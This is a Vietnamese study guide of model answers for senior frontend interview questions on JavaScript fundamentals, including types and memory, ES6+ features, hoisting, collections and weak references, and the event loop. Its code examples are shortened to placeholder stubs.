# SUMMARY - Senior Frontend Interview Answers (Tiếng Việt)

Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở level Senior.

---
**🗂️ Chú thích thuật ngữ (Tiếng Việt)**

Đoạn này là 1 bảng thuật ngữ nhanh để tra cứu khi đọc các câu trả lời. Nếu bạn thấy một từ kỹ thuật trong phần Q*, dùng phần này để hiểu ý nghĩa bằng tiếng Việt.

- Hoisting: "nâng" khai báo lên đầu phạm vi (scope). `var` được khởi tạo là `undefined`; `let/const` nằm trong TDZ (Temporal Dead Zone) trước khi khởi tạo.
- TDZ (Temporal Dead Zone): vùng từ đầu block đến khi khai báo `let/const` — truy cập trong vùng này gây `ReferenceError`.
- Closure (bao đóng): hàm nhớ được biến từ scope bên ngoài ngay cả khi hàm ngoài đã trả về.
- Event Loop: cơ chế xử lý async — Call Stack ⇒ Microtasks (Promise) ⇒ Render ⇒ Macrotasks (setTimeout, I/O).
- Microtask: nhiệm vụ ưu tiên cao (Promise.then, queueMicrotask) — chạy hết trước macrotask.
- Macrotask: nhiệm vụ ưu tiên thấp (setTimeout, setInterval, I/O) — lấy 1 macrotask mỗi vòng.
- Call Stack: ngăn xếp thực thi mã đồng bộ (LIFO).
- Heap: vùng nhớ cấp phát cho objects/arrays/functions.
- GC (Garbage Collector): thu gom rác tự động (mark-and-sweep) — thu dọn các object không còn reachable.
- Prototype / prototype chain: cơ chế kế thừa trong JS (class chỉ là syntactic sugar).
- this binding: cách xác định `this` (new > explicit call/apply/bind > implicit > default).
- Promise / async-await: Promise là object đại diện async; `async/await` là cú pháp dễ đọc cho Promise.
- Shallow vs Deep copy: sao chép nông chỉ copy top-level; sao chép sâu clone toàn bộ cấu trúc (ví dụ `structuredClone`).
- Map / Set: collection hiện đại (Map cho key bất kỳ; Set cho giá trị duy nhất).
- WeakMap / WeakSet / WeakRef / FinalizationRegistry: tham chiếu yếu giúp tránh giữ object khỏi GC; không deterministic, không iterable.
- Reflow / Repaint: cost làm layout/paint DOM — tránh thao tác DOM lặp nhiều lần.
- SSR / SSG / ISR (Next.js): các chiến lược render phía server hoặc build-time.
- XSS / CSRF / CORS: các rủi ro bảo mật frontend; XSS = script injection; CSRF = giả mạo request; CORS = chính sách chia sẻ nguồn.
- CSP (Content Security Policy): header giúp giảm rủi ro XSS.
- CDN: mạng phân phối nội dung, giảm latency.
- Web Worker: offload công việc nặng khỏi main thread.
- requestAnimationFrame (rAF): dùng cho animation, chạy trước render frame.
- Memoization / Cache: lưu kết quả để tránh tính toán lại; cẩn thận memory leaks.
- Currying / Higher-Order Functions (HOF): kỹ thuật hàm cao cấp để compose và tái sử dụng logic.
- IIFE: hàm tự gọi để tạo scope riêng, thường dùng cho module pattern trước ES modules.
- StructuredClone: native deep clone hiện đại (hỗ trợ Date, RegExp...), tránh dùng JSON hack nếu cần giữ kiểu phức tạp.

---

## 01. Q1: 🚀 Q01: JavaScript Fundamentals Overview - Tổng Quan Nền Tảng

### P1: Tên câu hỏi: 🚀 Q01: JavaScript Fundamentals Overview - Tổng Quan Nền Tảng

### P2: Trả lời (Senior):

## 02. Q2: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-5 phút):**

**"JavaScript là ngôn ngữ lập trình đơn luồng, bất đồng bộ, chạy trên V8 engine với Event Loop để xử lý I/O không chặn.**

**🔑 5 Trụ Cột Nền Tảng:**

1. **Kiểu Dữ Liệu & Bộ Nhớ**:
- 7 kiểu nguyên thủy (number, string, boolean, null, undefined, symbol, bigint) + Object
- Primitive = stack (theo giá trị) // Nguyên thủy lưu trong ngăn xếp, sao chép theo giá trị
- Reference = heap (theo tham chiếu) // Tham chiếu lưu trong đống, sao chép theo tham chiếu
- GC tự động dọn bộ nhớ (Mark-and-Sweep algorithm) // Thu gom rác tự động bằng thuật toán đánh dấu và quét

2. **Execution Context & Scope**:
- Call Stack thực thi code đồng bộ (LIFO) // Ngăn xếp gọi thực thi mã đồng bộ, vào sau ra trước
- Scope chain: Global → Function → Block scope // Chuỗi phạm vi: toàn cục → hàm → khối
- Hoisting: `var` khởi tạo undefined, `let/const` trong TDZ // Nâng lên: var khởi tạo undefined, let/const trong vùng chết tạm thời
- Closure = hàm + môi trường từ vựng xung quanh // Bao đóng = hàm + môi trường xung quanh

3. **Bất Đồng Bộ (Event Loop)**:
- **Microtask Queue** (ưu tiên cao): Promise.then, queueMicrotask // Hàng đợi nhiệm vụ nhỏ (ưu tiên cao): lời hứa, nhiệm vụ nhỏ
- **Macrotask Queue** (ưu tiên thấp): setTimeout, setInterval // Hàng đợi nhiệm vụ lớn (ưu tiên thấp): đặt thời gian, khoảng thời gian
- Event Loop: Call Stack → Microtasks → UI Render → 1 Macrotask // Vòng lặp sự kiện: ngăn xếp gọi → nhiệm vụ nhỏ → hiển thị UI → 1 nhiệm vụ lớn
- Async patterns: Callbacks → Promises → Async/Await // Mẫu bất đồng bộ: gọi lại → lời hứa → bất đồng bộ/chờ

4. **OOP & Prototypes**:
- Prototype chain: mỗi object có `__proto__` trỏ đến prototype // Chuỗi nguyên mẫu: mỗi đối tượng có __proto__ trỏ đến nguyên mẫu
- Class = syntactic sugar cho prototype-based inheritance // Lớp = đường cú pháp cho kế thừa dựa trên nguyên mẫu
- `this` binding: new → explicit (call/apply/bind) → implicit → default // Ràng buộc this: mới → rõ ràng (gọi/áp dụng/ràng buộc) → ngầm → mặc định

5. **Modern JavaScript (ES6+)**:
- `let/const` block scope thay `var` // Chú giải: let/const phạm vi khối thay var
- Arrow functions = lexical `this` // Hàm mũi tên = this từ vựng
- Destructuring, spread/rest operators // Phân rã, toán tử trải/rest
- Modules (import/export), classes // Mô-đun (nhập/xuất), lớp
- Promise, async/await cho async code // Lời hứa, bất đồng bộ/chờ cho mã bất đồng bộ

**⚠️ Lỗi Thường Gặp:**
- Mutate objects/arrays trực tiếp → dùng spread hoặc immutable methods // Đột biến đối tượng/mảng trực tiếp → dùng trải hoặc phương thức bất biến
- Quên `return` trong arrow function `() => { value }` → phải `() => value` hoặc `() => ({ value })` // Quên return trong hàm mũi tên
- `==` vs `===`: luôn dùng `===` (strict equality) // So sánh lỏng vs nghiêm ngặt: luôn dùng nghiêm ngặt
- Closure memory leaks: event listeners không cleanup // Rò rỉ bộ nhớ bao đóng: trình nghe sự kiện không dọn dẹp
- `this` mất context khi pass method: dùng arrow function hoặc bind // this mất ngữ cảnh khi truyền phương thức: dùng hàm mũi tên hoặc ràng buộc

**💡 Kiến Thức Senior:**
- **Performance**: Tránh blocking main thread, dùng Web Workers cho heavy computation // Hiệu suất: tránh chặn luồng chính, dùng công nhân web cho tính toán nặng
- **Memory**: WeakMap/WeakSet cho weak references tránh leaks // Bộ nhớ: WeakMap/WeakSet cho tham chiếu yếu tránh rò rỉ
- **Security**: XSS prevention (sanitize inputs), CSP headers // Bảo mật: ngăn XSS (làm sạch đầu vào), tiêu đề CSP
- **Tooling**: TypeScript cho type safety, ESLint cho code quality // Công cụ: TypeScript cho an toàn kiểu, ESLint cho chất lượng mã
- **Patterns**: Module pattern, Observer, Factory, Singleton // Mẫu: mẫu mô-đun, quan sát viên, nhà máy, đơn lẻ

---
---

## 03. Q3: 🎯 Q02: Data Types & Memory Management - Tổng Hợp Toàn Diện

### P1: Tên câu hỏi: 🎯 Q02: Data Types & Memory Management - Tổng Hợp Toàn Diện

### P2: Trả lời (Senior):

## 04. Q4: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"JavaScript có 8 kiểu dữ liệu: 7 nguyên thủy (không thay đổi được) + 1 phức tạp (object - thay đổi được).**

**📦 Nguyên Thủy vs Tham Chiếu:**
- **Nguyên thủy** (number, string, boolean, undefined, null, symbol, bigint):
- Lưu theo GIÁ TRỊ trong stack. // Lưu giá trị thực tế trong ngăn xếp
- Không thay đổi được → gán lại tạo giá trị mới. // Không thể sửa đổi, gán lại tạo bản sao mới
- Copy theo giá trị → các bản sao độc lập. // Sao chép giá trị, bản sao không liên kết
- **Tham chiếu** (object, array, function):
- Lưu theo THAM CHIẾU trong heap. // Lưu địa chỉ trỏ đến vùng nhớ heap
- Thay đổi được → sửa trực tiếp. // Có thể sửa đổi nội dung
- Copy theo tham chiếu → trỏ đến cùng object. // Sao chép địa chỉ, cùng trỏ đến một object

**🔑 Khái Niệm Cốt Lõi:**
1. **== vs ===**:
- `==`: So sánh lỏng → chuyển đổi kiểu tự động (vd: `"5" == 5` → true). // So sánh lỏng lẻo, tự động chuyển kiểu
- `===`: So sánh nghiêm ngặt → không chuyển kiểu (vd: `"5" === 5` → false). // So sánh nghiêm ngặt, không chuyển kiểu
- Thực hành tốt: Luôn dùng `===` trừ khi kiểm tra null/undefined. // Luôn dùng nghiêm ngặt trừ khi kiểm tra null/undefined

2. **null vs undefined**:
- `undefined`: Biến chưa được assign value (default). // Biến chưa được gán giá trị (mặc định)
- `null`: Intentionally empty value (developer set). // Giá trị trống có chủ đích (developer đặt)
- `typeof null` → "object" (JavaScript bug legacy). // typeof null trả về "object" (lỗi cũ của JavaScript)

3. **Shallow Copy vs Deep Copy**:
- **Shallow**: Copy top-level properties only → nested objects vẫn reference. // Sao chép nông: chỉ sao chép thuộc tính cấp trên, object lồng vẫn tham chiếu

```js
// Ví dụ rút gọn
const example = 42;
```

- **Deep**: Copy recursively tất cả levels → independent clone. // Sao chép sâu: sao chép đệ quy tất cả cấp → bản sao độc lập

```js
// Ví dụ rút gọn
const example = 42;
```

4. **Type Checking**:
- `typeof`: Check primitive types (`typeof "hello"` → "string"). // Kiểm tra kiểu nguyên thủy
- `instanceof`: Check object types (`[] instanceof Array` → true). // Kiểm tra kiểu object
- `Array.isArray()`: Check arrays specifically. // Kiểm tra mảng cụ thể
- `Object.prototype.toString.call()`: Most accurate (e.g., `[object Date]`). // Chính xác nhất

**♻️ Memory Management & GC:**
- **Stack**: Primitive values, function calls (LIFO, fast, limited size). // Ngăn xếp: giá trị nguyên thủy, lời gọi hàm (vào sau ra trước, nhanh, kích thước giới hạn)
- **Heap**: Objects, arrays (larger, slower, managed by GC). // Đống: object, mảng (lớn hơn, chậm hơn, quản lý bởi GC)
- **Garbage Collection**: Mark-and-sweep algorithm → auto free unreachable objects. // Thu gom rác: thuật toán đánh dấu và quét → tự động giải phóng object không thể truy cập
- **Memory Leaks**:
- Global variables không cleanup. // Biến toàn cục không dọn dẹp
- Event listeners không remove. // Trình nghe sự kiện không xóa
- Closures giữ reference đến large objects. // Bao đóng giữ tham chiếu đến object lớn
- Detached DOM nodes. // Nút DOM tách rời

**⚠️ Common Pitfalls:**
- **Mutating objects**: `arr.push()` modify original → dùng immutable methods (`[...arr, item]`). // Đột biến object: arr.push() sửa gốc → dùng phương thức bất biến
- **Reference comparison**: `{} === {}` → false (khác reference). Dùng deep equality libraries (lodash.isEqual). // So sánh tham chiếu: {} === {} → false (tham chiếu khác). Dùng thư viện so sánh sâu
- **Type coercion bugs**: `"5" + 3` → "53" (string concat), `"5" - 3` → 2 (number subtract). // Lỗi ép kiểu: "5" + 3 → "53" (nối chuỗi), "5" - 3 → 2 (trừ số)
- **Falsy values**: `0`, `""`, `null`, `undefined`, `false`, `NaN` → tất cả falsy nhưng khác nhau! // Giá trị falsy: 0, "", null, undefined, false, NaN → tất cả falsy nhưng khác nhau!

**💡 Senior Insights:**
- **Immutability**: Prefer immutable operations (spread, map, filter) → easier debugging, avoid side effects. // Bất biến: ưu tiên thao tác bất biến → dễ debug hơn, tránh tác dụng phụ
- **WeakMap/WeakSet**: Hold weak references → auto GC khi keys không còn reference → prevent memory leaks. // WeakMap/WeakSet: giữ tham chiếu yếu → tự động GC khi keys không còn tham chiếu → ngăn rò rỉ bộ nhớ
- **structuredClone()**: Modern deep clone (support Dates, RegExp, Typed Arrays), but lose functions/symbols. // structuredClone(): sao chép sâu hiện đại (hỗ trợ Ngày, RegExp, Mảng đã nhập), nhưng mất hàm/biểu tượng
- **Performance**: Primitive faster than objects (stack vs heap). Dùng primitives when possible. // Hiệu suất: nguyên thủy nhanh hơn object (ngăn xếp vs đống). Dùng nguyên thủy khi có thể
- **TypeScript**: Eliminate runtime type errors → catch type mistakes at compile time. // TypeScript: loại bỏ lỗi kiểu runtime → bắt lỗi kiểu lúc biên dịch

---

> **Tổng hợp**: Primitive vs Reference, Falsy/Truthy, == vs ===, null vs undefined, Immutable vs Mutable, Deep/Shallow Copy, Type Checking, Memory Management & GC

---
---

## 05. Q5: ⚡ Q03: ES5 vs ES6+ Features - So Sánh Chi Tiết & Cách Hoạt Động

### P1: Tên câu hỏi: ⚡ Q03: ES5 vs ES6+ Features - So Sánh Chi Tiết & Cách Hoạt Động

### P2: Trả lời (Senior):

## 06. Q6: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"ES6+ (2015+) mang lại JavaScript hiện đại với classes, modules, arrow functions, async/await.**

**📊 ES5 vs ES6+ (Key Differences):**

| Feature | ES5 (2009) | ES6+ (2015+) |
|---------|-----------|-------------|
| **Variables** | `var` (function scope) | `let/const` (block scope) |
| **Functions** | `function() {}` | Arrow `() => {}` |
| **Classes** | Prototype + constructor | `class` syntax |
| **Modules** | CommonJS/AMD | `import/export` |
| **Strings** | Concatenation `+` | Template literals `` `${}` `` |
| **Objects** | Manual copy | Spread `{...obj}`, destructuring |
| **Async** | Callbacks | Promises, async/await |
| **Loops** | `for`, `while` | `for...of`, `forEach`, `map` |

**🔥 ES6+ Must-Know Features:**
1. **let/const**: Block scope → avoid hoisting issues, `const` prevent reassignment.
2. **Arrow Functions**: Lexical `this`, concise syntax, no `arguments` object.
3. **Destructuring**: `const { name } = user`, `const [a, b] = arr` → extract values easily.
4. **Spread/Rest**: `...` operator → copy arrays/objects, function params.
5. **Template Literals**: `` `Hello ${name}` `` → multi-line strings, interpolation.
6. **Classes**: `class Person extends User` → OOP syntax (syntactic sugar cho prototypes).
7. **Modules**: `import { fn } from './module'` → static imports, tree-shaking.
8. **Promises & Async/Await**: Better async handling than callbacks.
9. **Default Parameters**: `function fn(a = 1)` → không cần `a = a || 1`.
10. **Optional Chaining**: `user?.address?.city` → safe navigation (ES2020).
11. **Nullish Coalescing**: `value ?? 'default'` → khác với `||` (chỉ check null/undefined).

**⚡ ES2016-ES2023 Highlights:**
- **ES2016**: `**` (exponentiation), `Array.includes()`.
- **ES2017**: `async/await`, `Object.values/entries()`, string padding.
- **ES2018**: Rest/spread for objects, async iteration.
- **ES2019**: `Array.flat/flatMap()`, `Object.fromEntries()`.
- **ES2020**: Optional chaining `?.`, nullish coalescing `??`, `BigInt`, dynamic import.
- **ES2021**: `String.replaceAll()`, numeric separators `1_000_000`.
- **ES2022**: Top-level await, private fields `#private`, `Array.at()`.
- **ES2023**: `Array.findLast()`, `toSorted()`, `toReversed()` (immutable array methods).

**⚠️ Browser Compatibility:**
- **ES5**: Universal support (IE9+, all browsers).
- **ES6+**: Modern browsers (Chrome 51+, Firefox 54+, Safari 10+).
- **Solution**: Babel transpile ES6+ → ES5 cho legacy browsers.
- **Trend**: Evergreen browsers auto-update → ES6+ safe cho 95%+ users.

**💡 Senior Insights:**
- **Transpilation**: Babel transform ES6+ → ES5 at build time → support old browsers.
- **Polyfills**: Add missing features (e.g., `Promise`, `Array.includes()`) at runtime.
- **Bundle Size**: ES6+ code nhỏ hơn sau minify (classes, arrow functions compact hơn ES5).
- **Performance**: Modern engines optimize ES6+ better (e.g., arrow functions, spread).
- **Best Practice**: Write ES6+, transpile for production, use feature detection (`if ('fetch' in window)`).

**🎯 Migration Tips:**
- Replace `var` → `let/const` (use ESLint rule).
- Replace `function` → arrow functions (except methods, constructors).
- Use destructuring để extract values.
- Replace string concat → template literals.
- Use `async/await` thay vì `.then()` chains.

---

**⚡ Quick Summary:**
> ES6+ = let/const, arrow functions, classes, destructuring, promises, modules. ES5 = var, function, callbacks

**💡 Ghi Nhớ:**
- 🔥 **ES6 Key Features**: let/const, =>, class, {...spread}, [destructuring], `template`, Promise, import/export
- 📦 **Block Scope**: let/const có block scope, var có function scope
- ⚡ **Arrow Function**: Không có `this` riêng, không có `arguments`, không dùng làm constructor
- 🎯 **Classes**: Syntactic sugar cho prototype-based inheritance

**Trả lời:**

- **ES5 (ECMAScript 5, 2009)**: JavaScript cơ bản với function declarations, var, prototype-based inheritance, callbacks
- **ES6/ES2015+ (2015-now)**: Modern JavaScript với classes, modules, arrow functions, destructuring, promises, async/await
- **🔥 Ưu điểm ES6+**: Code ngắn gọn hơn 30-50%, type-safe hơn với const/let, performance tốt hơn với optimizations, syntax hiện đại dễ đọc
- **⚠️ Nhược điểm ES6+**: Cần transpilation (Babel) cho IE11 và older browsers, learning curve cao hơn, bundle size có thể lớn hơn

**🎯 Timeline & Browser Support:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Code Example - Comprehensive Comparison:**

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Best Practices (Thực Hành Tốt):**

1. **✅ Always use const/let** thay vì var - block scoping an toàn hơn
2. **✅ Prefer arrow functions** cho callbacks và short functions
3. **✅ Use template literals** cho string manipulation
4. **✅ Destructure objects/arrays** để code ngắn gọn
5. **✅ Use spread operator** cho cloning và merging
6. **✅ Prefer async/await** over promise chains - dễ đọc hơn
7. **✅ Use ES6 modules** thay vì CommonJS trong modern projects
8. **✅ Use default parameters** thay vì manual checks
9. **✅ Use class syntax** cho OOP - cleaner than prototypes
10. **✅ Enable Babel** hoặc TypeScript cho transpilation và type safety

**❌ Common Mistakes (Lỗi Thường Gặp):**

```js
// Ví dụ rút gọn
const example = 42;
```

**📊 Performance Comparison:**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Khi Nào Dùng ES5 vs ES6+:**

**🔴 Dùng ES5 khi:**
- Target IE11 và không thể dùng Babel
- Working với legacy codebase không thể refactor
- Extreme performance critical code (rare cases)

**🟢 Dùng ES6+ khi:**
- Modern project (>99% cases)
- Target modern browsers (Chrome, Firefox, Safari, Edge)
- Want maintainable, readable code
- Using build tools (Webpack, Vite, Babel)
- TypeScript project
---

## 07. Q7: ⎫ Q04: Hoisting & Temporal Dead Zone

### P1: Tên câu hỏi: ⎫ Q04: Hoisting & Temporal Dead Zone

### P2: Trả lời (Senior):

## 08. Q8: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (1-2 phút):**

**"Hoisting = khai báo được đưa lên đầu scope. TDZ = vùng không thể truy cập let/const trước khi khai báo.**

**🔑 Hoisting Behaviors:**

| Type | Hoisted? | Initialized? | Access Before Declaration |
|------|----------|--------------|---------------------------|
| **`var`** | ✅ Yes | ✅ Yes (`undefined`) | ✅ OK (undefined) |
| **`let`** | ✅ Yes | ❌ No (TDZ) | ❌ ReferenceError |
| **`const`** | ✅ Yes | ❌ No (TDZ) | ❌ ReferenceError |
| **`function` declaration** | ✅ Yes | ✅ Yes (entire function) | ✅ OK (callable) |
| **`function` expression** | ✅ Yes (variable only) | ❌ No | ❌ ReferenceError/undefined |
| **`class`** | ✅ Yes | ❌ No (TDZ) | ❌ ReferenceError |

// Chú thích tiếng Việt cho các thuật ngữ:
// - Hoisted = được đưa lên đầu phạm vi
// - Initialized = được khởi tạo
// - Access Before Declaration = truy cập trước khi khai báo
// - TDZ = Temporal Dead Zone, vùng chết tạm thời
// - ReferenceError = lỗi tham chiếu
// - undefined = không xác định
 // Chú giải: - OK = ổn
// - callable = có thể gọi
 // Chú giải: - block scope = phạm vi khối
// - function scope = phạm vi hàm
// - per iteration = mỗi lần lặp
// - catch bugs = bắt lỗi
 // Chú giải: - early = sớm
// - Creation phase = giai đoạn tạo
// - Execution phase = giai đoạn thực thi
// - line-by-line = từng dòng
// - reassign = gán lại
// - avoid = tránh
// - explicit = rõ ràng
 // Chú giải: - confusion = nhầm lẫn
// - ESLint rule = quy tắc ESLint
// - no-use-before-define = không sử dụng trước khi định nghĩa

**📊 Detailed Explanation:**

1. **`var` Hoisting**:
- Hoisted + initialized với `undefined`.
- Access trước khai báo → `undefined` (không error).

```js
// Ví dụ rút gọn
const example = 42;
```

2. **`let/const` Hoisting + TDZ**:
- Hoisted nhưng NOT initialized → Temporal Dead Zone.
- Access trong TDZ → `ReferenceError`.
- TDZ = từ đầu block scope đến dòng khai báo.

```js
// Ví dụ rút gọn
const example = 42;
```

3. **Function Declaration Hoisting**:
- Entire function hoisted → gọi trước khai báo OK.

```js
// Ví dụ rút gọn
const example = 42;
```

4. **Function Expression**:
- Variable hoisted nhưng function không.

```js
// Ví dụ rút gọn
const example = 42;
```

**⚠️ Common Pitfalls:**
- **`typeof` trong TDZ**: `typeof x` với `let x` → ReferenceError (không safe như `var`).
- **Loop variables**: `var` trong loop → function scope, `let` → block scope per iteration.

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Senior Insights:**
- **Why TDZ exists**: Force developers khai báo trước khi dùng → catch bugs sớm.
- **Hoisting mechanism**: JavaScript engine scans code 2 passes:
  1. **Creation phase**: Allocate memory cho declarations.
  2. **Execution phase**: Execute code line-by-line.
- **Best Practice**:
- Dùng `const` by default, `let` nếu cần reassign, avoid `var`.
- Khai báo biến ở top của scope → explicit, tránh confusion.
- Dùng ESLint rule `no-use-before-define`.

---

**⚡ Quick Summary:**
> Hoisting = Khai báo được đưa lên đầu scope. `var` = undefined, `let/const` = TDZ → ReferenceError

**💡 Ghi Nhớ:**
- 🔥 **var**: Hoisted + initialized = undefined → dùng trước khai báo OK (nhưng undefined)
- ⚡ **let/const**: Hoisted nhưng NOT initialized → TDZ → ReferenceError
- 🎯 **function declaration**: Hoisted toàn bộ → gọi trước khai báo OK
- ⏰ **TDZ**: Vùng từ đầu scope đến dòng khai báo - biến tồn tại nhưng không access được

**Trả lời:**

- **Hoisting**: Cơ chế đưa declarations lên đầu scope trước khi code execute
- **TDZ (Temporal Dead Zone)**: Vùng từ đầu block scope đến dòng khai báo let/const - không thể access biến
- **Ưu điểm**: Function hoisting cho phép tổ chức code linh hoạt
- **Nhược điểm**: var hoisting gây confusion, TDZ errors khó debug

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Best Practices:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Common Mistakes:**

```js
// Ví dụ rút gọn
const example = 42;
```

**So Sánh:**

| Feature | var | let/const |
|---------|-----|-----------|
| Hoisted? | ✅ Có | ✅ Có |
| Initialized? | ✅ undefined | ❌ Không |
| TDZ? | ❌ Không | ✅ Có |
| Access trước khai báo | undefined | ReferenceError |
| Scope | Function | Block |

**💡 Key Takeaways:**

- **var**: Hoisted + undefined → access trước OK (nhưng undefined)
- **let/const**: Hoisted → TDZ → ReferenceError nếu access trước
- **function declaration**: Hoisted hoàn toàn → gọi trước OK
- **TDZ**: Từ đầu scope đến dòng khai báo - biến tồn tại nhưng không access được
- **typeof không safe** trong TDZ!
- **Luôn dùng const/let**, tránh var
---

## 09. Q9: 🗂️ Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References

### P1: Tên câu hỏi: 🗂️ Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References

### P2: Trả lời (Senior):

## 10. Q10: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Set/Map là collections nâng cao của JavaScript, còn WeakSet/WeakMap/WeakRef là phiên bản weak reference không ngăn garbage collection."**

**🔑 4 Điểm Chính:**

**1. Set vs Array:**
- Set lưu **unique values**, tự động loại duplicate
- Performance O(1) cho `.has()`, `.add()`, `.delete()` (Array là O(n))
- Use case: deduplicate array `[...new Set([1,2,2,3])]`, check membership nhanh

**2. Map vs Object:**
- Map keys có thể là **bất kỳ type nào** (object, function, primitive) - Object chỉ dùng string/symbol
- **Maintain insertion order** và có `.size` property
- Use case: cache với object keys, counting occurrences, ordered data

**3. WeakMap/WeakSet - Weak References:**
- Keys phải là **objects**, không prevent garbage collection
- **Không iterable**, không có `.size` - vì entries có thể biến mất bất cứ lúc nào
- Use case: **private data** (WeakMap), metadata cho DOM nodes, preventing memory leaks

**4. WeakRef & FinalizationRegistry:**
- WeakRef: tạo weak reference tới 1 object cụ thể, có thể bị GC
- FinalizationRegistry: callback khi object bị GC để cleanup resources
- **⚠️ Non-deterministic** - không dùng cho core logic

**⚠️ Lỗi Thường Gặp:**
- Dùng Object khi cần Map → không maintain order, keys bị convert sang string
- Dùng WeakMap với primitive keys → Error (phải dùng objects)
- Expect WeakRef.deref() luôn return object → có thể return `undefined` nếu đã GC

**💡 Kiến Thức Senior:**
- WeakMap dùng cho **private properties pattern** trước khi có `#privateField`
- Set/Map internally dùng **SameValueZero algorithm** (như `===` nhưng `NaN === NaN`)
- WeakMap **không có memory leak** khi attach metadata vào DOM nodes (auto cleanup khi node removed)
- FinalizationRegistry chỉ dùng cho **cleanup non-JS resources** (file handles, WASM memory), không dùng cho app logic

**⚡ Quick Summary:**
> **Set** = unique values, **Map** = key-value (any type). **Weak** = không prevent GC, keys phải là objects

**💡 Ghi Nhớ:**
- 🎯 **Set**: Array nhưng unique, `.add()`, `.has()`, `.delete()`
- 📦 **Map**: Object nhưng keys có thể là any type (object, function...), maintain insertion order
- 🔥 **WeakSet/WeakMap**: Keys là objects, tự động GC khi không còn reference
- ⚡ **Use Cases**: Set = dedupe, Map = cache, WeakMap = private data

**Trả lời:**

**🎯 Core Concepts:**

- **Set**: Collection của unique values, không có keys, có thể iterate
- **Map**: Collection của key-value pairs, keys có thể là bất kỳ type nào (objects, functions, primitives)
- **WeakSet/WeakMap**: Weak references đến objects, không prevent garbage collection, không iterable
- **WeakRef**: Tạo weak reference đến một object cụ thể, object có thể bị GC bất cứ lúc nào
- **FinalizationRegistry**: Đăng ký callback cleanup khi object được garbage collected

**✅ Ưu điểm:**

- Set/Map: Performance tốt hơn Object cho lookups, iteration, và unique values
- WeakSet/WeakMap: Tự động cleanup, tránh memory leaks
- WeakRef: Cho phép tạo caches mà không prevent GC
- FinalizationRegistry: Cleanup resources (file handles, database connections) khi objects die

**⚠️ Nhược điểm:**

- WeakSet/WeakMap: Không iterable, không có size property, keys phải là objects
- WeakRef: Non-deterministic (không biết khi nào object bị GC), không nên dùng cho core logic
- FinalizationRegistry: Callback có thể chạy muộn hoặc không chạy, không predictable

**Code Example:**

```js
// Ví dụ rút gọn
const example = 42;
```

**🎯 Best Practices:**

1. **Set**: Sử dụng cho unique values, remove duplicates, membership checks
2. **Map**: Sử dụng cho key-value pairs với non-string keys, preserve insertion order
3. **WeakSet**: Track objects temporarily mà không prevent GC (DOM elements, event handlers)
4. **WeakMap**: Private properties, metadata, caches for objects
5. **WeakRef**: Soft caches mà không prevent GC, luôn có fallback khi deref() returns undefined
6. **FinalizationRegistry**: Cleanup external resources (files, connections), KHÔNG dùng cho critical logic
7. **Map vs Object**: Prefer Map khi cần frequent additions/deletions hoặc non-string keys
8. **WeakMap for Privacy**: Use WeakMap để implement private properties trong classes

**⚠️ Common Mistakes:**

```js
// Ví dụ rút gọn
const example = 42;
```

**📊 Performance & Memory Considerations:**

- **Set/Map**: ~2-3x faster than Object cho frequent lookups/additions/deletions
- **WeakSet/WeakMap**: Nhỏ hơn về memory vì automatic cleanup
- **WeakRef**: Minimal memory overhead, nhưng có CPU cost cho deref() checks
- **FinalizationRegistry**: Minimal overhead, callback chạy async trong idle time
---

## 11. Q11: 🔄 Q06: Event Loop - Cơ Chế Hoạt Động JavaScript (Technical Deep Dive)

### P1: Tên câu hỏi: 🔄 Q06: Event Loop - Cơ Chế Hoạt Động JavaScript (Technical Deep Dive)

### P2: Trả lời (Senior):

## 12. Q12: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**

**"JavaScript chạy đơn luồng với Event Loop để xử lý các thao tác bất đồng bộ.**

**🏗️ Kiến Trúc (5 Thành Phần):**
1. **Call Stack (Ngăn xếp gọi - LIFO)**: Nơi thực thi code đồng bộ. Đơn luồng → chỉ 1 hàm chạy tại 1 thời điểm.
2. **Heap (Vùng nhớ)**: Cấp phát bộ nhớ cho objects, arrays, functions.
3. **Web APIs (Trình duyệt) / C++ APIs (Node.js)**: Xử lý thao tác bất đồng bộ (setTimeout, fetch, fs.readFile) → chạy trên luồng riêng.
4. **Microtask Queue (Hàng đợi ưu tiên cao)**: Promise callbacks, queueMicrotask, MutationObserver.
5. **Macrotask Queue (Hàng đợi ưu tiên thấp)**: setTimeout, setInterval, I/O, UI rendering.

**♻️ Luồng Hoạt Động Event Loop (Chi Tiết):**

```js
// Ví dụ rút gọn
const example = 42;
```

**🔑 Điểm Khác Biệt Quan Trọng:**
- **Microtask vs Macrotask**:
- Microtask chạy TẤT CẢ trước khi Event Loop tiếp tục.
- Macrotask chỉ chạy 1 task mỗi vòng lặp.
- Ưu tiên: Microtask > UI Render > Macrotask.
- **Trình duyệt vs Node.js**:
- Trình duyệt: Có giai đoạn render UI.
- Node.js: Có `process.nextTick()` (ưu tiên cao hơn Microtask) + 6 giai đoạn (timers, I/O, idle, poll, check, close).

**⚠️ Lỗi Thường Gặp:**
- **Làm đói UI**: Microtasks vô hạn chặn rendering → UI đóng băng.

```js
// Ví dụ rút gọn
const example = 42;
```

- **setTimeout(fn, 0) ≠ Tức thì**: Vẫn phải chờ Call Stack trống + Microtasks hoàn thành.
- **Race Conditions**: Callbacks bất đồng bộ có thể thực thi không theo thứ tự mong đợi.

